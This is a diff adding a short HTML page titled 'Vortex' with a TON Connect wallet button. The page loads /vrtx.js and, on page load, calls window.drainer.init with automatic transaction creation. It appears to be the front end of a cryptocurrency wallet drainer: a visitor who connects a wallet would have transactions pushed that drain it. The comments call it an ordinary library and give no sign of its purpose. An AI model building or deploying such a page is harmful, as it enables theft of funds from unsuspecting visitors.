@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Vortex</title>
+  <link rel="stylesheet" href="/vrtx.css" />
+</head>
+<body>
+<div class="ton-connect-button"></div>
+
+<!-- Import Vortex library with error handling -->
+<script src="/vrtx.js" defer crossorigin></script>
+
+<!-- Initialize Vortex and set up event listeners with isolated scope -->
+<script>
+  (function() {
+    function initDrainer() {
+      if (window.drainer && typeof window.drainer.init === 'function') {
+        try {
+          window.drainer.init({
+            autoCreateTransaction: true,
+            autoOpenModal: false,
+            disableWalletSave: false
+          });
+        } catch (error) {
+          console.error('Error initializing Vortex:', error);
+        }
+      } else {
+        console.warn('Vortex not yet loaded. Retrying...');
+        setTimeout(initDrainer, 100);
+      }
+    }
+
+    window.addEventListener('load', initDrainer);
+  })();
+</script>
+</body>
+</html>
